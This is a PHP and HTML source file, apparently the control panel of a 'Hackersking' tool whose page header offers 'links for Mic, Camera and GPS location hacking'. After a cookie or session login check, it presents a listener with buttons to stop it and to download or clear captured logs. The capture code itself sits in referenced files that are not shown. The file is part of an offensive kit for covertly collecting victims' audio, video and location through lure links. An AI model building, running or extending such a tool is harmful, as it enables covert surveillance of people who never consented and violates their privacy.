<?php
session_start();
include "./assets/components/login-arc.php";


if(isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no"){
    if(!isset($_SESSION['IAm-logined'])){
        $_SESSION['IAm-logined'] = 'yes';
    }

}
elseif(isset($_SESSION['IAm-logined'])){
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);

}


else {
    header('location: login.php');
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name=”viewport” content=”width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <title>Hackersking</title>

</head>

<body id="ourbody">
    <div style="text-align:center; background: black; color:white; padding:30px;">
    <img src="logo.png" alt="Hackersking" width="50" height="50">
        <b> Here is the list of links for Mic, Camera and GPS location hacking</b>
    </div>

<div id="links"></div>


<div class="mt-2 d-flex justify-content-center">
    <textarea class="form-control w-50 m-3" placeholder="result ..." id="result" rows="10" ></textarea>
</div>

<div class="mt-2 d-flex justify-content-center">
    <button class="btn btn-danger m-2" id="btn-listen">Listener Runing / press to stop</button>
    <button class="btn btn-success m-2" id="btn-listen" onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button>
    <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
</div>


</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>